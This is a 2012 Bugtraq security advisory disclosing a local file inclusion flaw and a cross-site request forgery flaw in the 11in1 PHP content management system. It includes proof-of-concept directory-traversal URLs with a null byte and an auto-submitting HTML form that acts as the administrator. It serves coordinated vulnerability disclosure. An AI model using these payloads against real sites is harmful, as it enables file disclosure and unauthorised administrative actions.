
Date: Wed, 15 Feb 2012 15:18:15 +0100 (CET)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: Multiple vulnerabilities in 11in1

Advisory ID: HTB23071
Product: 11in1
Vendor: 11in1
Vulnerable Version(s): 1.2.1 stable 12-31-2011 and probably prior
Tested Version: 1.2.1 stable 12-31-2011
Vendor Notification: 25 January 2012 
Public Disclosure: 15 February 2012 
Vulnerability Type: Local File Inclusion, Сross-Site Request Forgery (CSRF)
Risk Level: High 
Credit: High-Tech Bridge SA Security Research Lab ( https://www.htbridge.ch/advisory/ ) 

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in 11in1, which can be exploited to perform Local File Inclusion and Сross-Site Request Forgery (CSRF) attacks.

1) Local File Inclusion in 11in1: CVE-2012-0996

Input passed via the "class" GET parameter to index.php and /admin/index.php is not properly verified before being used to include local files. 
This can be exploited to include local files via directory traversal sequences and URL-encoded NULL bytes.

The following PoC (Proof of Concept) demostrate the vulnerability:

http://[host]/index.php?class=../../../tmp/file%00
http://[host]/admin/index.php?class=../../../tmp/file%00

Successful exploitation of the vulnerabilities requires that "magic_quotes_gpc" is off.

2) Сross-Site Request Forgery (CSRF) in 11in1: CVE-2012-0997

The application allows authorized users to perform certain actions via HTTP requests without making proper validity checks to verify the source of the requests.

An attacker should make logged-in administrator open a malicious link in the browser to exploit this vulnerability.

The following PoC  will create a new topic on behalf of website administrator:


<form action="http://[host]/admin/index.php?class=do&action=addTopic" method="post">
<input type="hidden" name="name" value="New Topic Name here">
<input type="hidden" name="sec" value="3">
<input type="hidden" name="content" value="New Topic Content here">
<input type="submit" id="btn"> 
</form>
<script>
document.getElementById('btn').click();
</script>




-----------------------------------------------------------------------------------------------

References:

[1] High-Tech Bridge Advisory HTB23071 - https://www.htbridge.ch/advisory/HTB23071 - Multiple vulnerabilities in 11in1.
[2] 11in1 - http://www.11in1.org/ - Eleven In One is an open-source content management system (CMS) that is powered by PHP and MySQL.
[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.

-----------------------------------------------------------------------------------------------

Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.

